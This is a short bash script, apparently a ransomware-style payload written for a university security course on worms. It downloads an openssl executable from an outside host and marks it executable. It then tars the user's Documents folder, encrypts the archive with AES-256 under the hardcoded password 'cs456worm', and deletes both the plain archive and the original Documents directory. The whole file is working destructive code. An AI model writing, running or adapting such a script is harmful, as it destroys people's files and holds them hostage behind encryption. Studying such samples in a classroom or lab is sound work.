#!/bin/bash

wget http://ecs.fullerton.edu/~mgofman/openssl
chmod a+x /home/ubuntu/openssl
cd cpsc; tar -cvf nekos.tar Documents
cd
openssl aes-256-cbc -a -salt -in /home/ubuntu/cpsc/nekos.tar -out /home/ubuntu/cpsc/nekos.tar.enc -k cs456worm
rm /home/ubuntu/cpsc/nekos.tar
rm -rf /home/ubuntu/cpsc/Documents
